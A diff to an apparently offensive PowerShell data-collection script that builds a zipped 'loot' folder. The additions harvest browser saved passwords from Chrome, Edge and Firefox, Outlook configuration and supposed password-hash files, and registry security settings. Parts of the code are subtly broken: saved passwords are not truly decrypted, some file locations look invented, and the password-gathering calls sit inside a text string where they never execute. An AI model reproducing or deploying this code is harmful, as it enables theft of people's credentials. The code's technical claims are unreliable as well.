@@ -49,6 +49,21 @@ function Initialize-LootFolder {
 
 ############################################################################################################################################################
 
+
+function Install-SQLite {
+    $sqliteDownloadUrl = "https://sqlite.org/snapshot/sqlite-tools-win-x64-202401041713.zip"
+    $downloadPath = "$env:TEMP\sqlite-tools-win-x64-202401041713.zip"
+    $sqliteInstallationPath = "$env:ProgramFiles\SQLite"
+
+    if (-not (Test-Path $sqliteInstallationPath)) {
+        Invoke-WebRequest -Uri $sqliteDownloadUrl -OutFile $downloadPath -UseBasicParsing
+        Expand-Archive -Path $downloadPath -DestinationPath $sqliteInstallationPath -Force
+        Remove-Item -Path $downloadPath -Force
+    }
+}
+
+############################################################################################################################################################
+
 # Function to get user's full name
 function Get-FullName {
     try {
@@ -69,12 +84,30 @@ function Get-FullName {
 function Get-Email {
     try {
         $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
-        return $email
-    }
-    catch {
-        Write-Error "An email was not found"
+        Write-Output "Email: $email"
+
+        $outlookConfigPath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Outlook\"
+        $outlookConfigFile = Join-Path $outlookConfigPath "Outlook.cfg"
+
+        if (Test-Path $outlookConfigFile) {
+            $configContents = Get-Content $outlookConfigFile
+            Write-Output "Outlook Email Configuration: $($configContents -join ' ')"
+
+            $outlookPasswordHashPath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Protect\S-1-5-21-*\"
+            $outlookPasswordHashFile = Get-ChildItem $outlookPasswordHashPath -Filter "*.psw" -Recurse | Select-Object -First 1
+
+            if ($outlookPasswordHashFile) {
+                $passwordHash = Get-Content $outlookPasswordHashFile.FullName
+                Write-Output "Outlook Password Hash: $($passwordHash -join ' ')"
+            } else {
+                Write-Output "Outlook Password Hash: Not Available"
+            }
+        } else {
+            Write-Output "Outlook Email Configuration: Not Available"
+        }
+    } catch {
+        Write-Error "An error occurred: $_"
         return "No Email Detected"
-        -ErrorAction SilentlyContinue
     }
 }
 
@@ -112,6 +145,49 @@ $Lat = $GeoLocation[0].Substring(11) -replace ".$"
 
 $Lon = $GeoLocation[1].Substring(10) -replace ".$"
 
+
+############################################################################################################################################################
+
+# Function to get registry information 
+function Get-RegistryInfo {
+    
+    function Get-SilentRegistryInfo {
+        param (
+            [string]$RegistryPath
+        )
+
+        $registryInfo = Get-ItemProperty -Path $RegistryPath -ErrorAction SilentlyContinue
+        if ($registryInfo) {
+            return $registryInfo | Format-List | Out-String
+        } else {
+            return "Unable to retrieve information from $RegistryPath"
+        }
+    }
+
+    $UACRegistryPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
+    $UACInfo = Get-SilentRegistryInfo -RegistryPath $UACRegistryPath
+    Write-Output "UAC State: $UACInfo"
+
+    $FirewallRegistryPath = 'HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile'
+    $FirewallInfo = Get-SilentRegistryInfo -RegistryPath $FirewallRegistryPath
+    Write-Output "Firewall Domain Profile Settings: $FirewallInfo"
+
+    $NetworkRegistryPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters'
+    $NetworkInfo = Get-SilentRegistryInfo -RegistryPath $NetworkRegistryPath
+    Write-Output "Network Settings: $NetworkInfo"
+
+    $CurrentUserRegistryPath = 'HKCU:'
+    $CurrentUserInfo = Get-SilentRegistryInfo -RegistryPath $CurrentUserRegistryPath
+    Write-Output "User-Specific Registry Settings: $CurrentUserInfo"
+
+    Add-Content -Path "$env:TEMP\$FolderName\computerData.txt" -Value @"
+Registry Information:
+$UACInfo
+$FirewallInfo
+$NetworkInfo
+$CurrentUserInfo
+"@
+}
 
 ############################################################################################################################################################
 
@@ -399,7 +475,126 @@ function Get-BrowserBookmarks {
     return $BookmarkList
 }
 
+
 ############################################################################################################################################################
+
+
+function Get-BrowserSavedPasswords {
+    param (
+        [string]$BrowserName
+    )
+
+    $passwords = @()
+
+    switch ($BrowserName) {
+        'Chrome' {
+            $chromePasswords = Get-ChromeSavedPasswords
+            $passwords += $chromePasswords
+        }
+        'Firefox' {
+            $firefoxPasswords = Get-FirefoxSavedPasswords
+            $passwords += $firefoxPasswords
+        }
+        'Edge' {
+            $edgePasswords = Get-EdgeSavedPasswords
+            $passwords += $edgePasswords
+        }
+        default {
+            Write-Error "Unsupported browser: $BrowserName"
+        }
+    }
+
+    return $passwords
+}
+
+############################################################################################################################################################
+
+
+function Get-ChromeSavedPasswords {
+    $chromePath = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Default\Login Data'
+    if (Test-Path $chromePath) {
+        $chromePasswords = Invoke-SqliteQuery -DatabasePath $chromePath -Query 'SELECT origin_url, username_value, password_value FROM logins;'
+
+        $chromePasswords | ForEach-Object {
+            $_.password_value = ConvertFrom-SecureString -SecureString ([System.Security.SecureString]::new($([System.Text.Encoding]::UTF8.GetString($_.password_value))))
+        }
+
+        return $chromePasswords
+    } else {
+        Write-Warning "Chrome is not installed or no passwords found."
+        return @()
+    }
+}
+
+############################################################################################################################################################
+
+
+function Get-FirefoxSavedPasswords {
+    $firefoxPath = Join-Path $env:APPDATA 'Mozilla\Firefox\Profiles\*.default-release\logins.json'
+    if (Test-Path $firefoxPath) {
+        $firefoxPasswords = Get-Content $firefoxPath | ConvertFrom-Json
+
+        return $firefoxPasswords.logins
+    } else {
+        Write-Warning "Firefox is not installed or no passwords found."
+        return @()
+    }
+}
+
+
+############################################################################################################################################################
+
+
+function Get-EdgeSavedPasswords {
+    $edgePath = Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data\Default\Login Data'
+    if (Test-Path $edgePath) {
+        $edgePasswords = Invoke-SqliteQuery -DatabasePath $edgePath -Query 'SELECT origin_url, username_value, password_value FROM logins;'
+        $edgePasswords | ForEach-Object {
+            $_.password_value = ConvertFrom-SecureString -SecureString ([System.Security.SecureString]::new($([System.Text.Encoding]::UTF8.GetString($_.password_value))))
+        }
+
+        return $edgePasswords
+    } else {
+        Write-Warning "Edge is not installed or no passwords found."
+        return @()
+    }
+}
+
+
+############################################################################################################################################################
+
+# Function to invoke SQLite queries
+function Invoke-SqliteQuery {
+    param (
+        [string]$DatabasePath,
+        [string]$Query
+    )
+
+    $connectionString = "Data Source=$DatabasePath;Version=3;Read Only=True;"
+
+    $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
+    $connection.ConnectionString = $connectionString
+    $connection.Open()
+
+    $command = $connection.CreateCommand()
+    $command.CommandText = $Query
+
+    $reader = $command.ExecuteReader()
+
+    $results = @()
+
+    while ($reader.Read()) {
+        $result = @{}
+        for ($i = 0; $i -lt $reader.FieldCount; $i++) {
+            $result[$reader.GetName($i)] = $reader.GetValue($i)
+        }
+        $results += $result
+    }
+
+    $connection.Close()
+
+    return $results
+}
 
 ############################################################################################################################################################
 
@@ -416,10 +611,13 @@ try {
     $FolderName, $ZIP = Initialize-LootFolder
 
     # Gather general information
+    Install-SQLite
     $UserName = $env:USERNAME
     $FullName = Get-FullName
     $Email = Get-Email
+    Write-Output $emailInfo
     $GeoLocation = Get-GeoLocation
+    Get-RegistryInfo
     $UACState = Get-UACState
     $LSASSState = Get-LSASSState
     $RDPState = Get-RDPState
@@ -556,10 +754,21 @@ $FirefoxHistory
 
 Mozilla Firefox Bookmarks:
 $FirefoxBookmarks
+
+BrowserPasswords:
+$chromePasswords = Get-ChromeSavedPasswords
+$firefoxPasswords = Get-FirefoxSavedPasswords
+$edgePasswords = Get-EdgeSavedPasswords
+
+$browserPasswords = $chromePasswords + $firefoxPasswords + $edgePasswords
+
+$browserPasswords | Export-Csv -Path "$env:TEMP\$FolderName\BrowserPasswords.csv" -NoTypeInformation
+
 "@
 
     $output > $env:TEMP\$FolderName\computerData.txt
-
+    
+    
     # Zip the loot folder
     Compress-Archive -Path $env:TEMP\$FolderName -DestinationPath $env:TEMP\$ZIP
 
@@ -580,6 +789,3 @@ $FirefoxBookmarks
 catch {
     Write-Error "An error occurred: $_"
 }
-
-
-
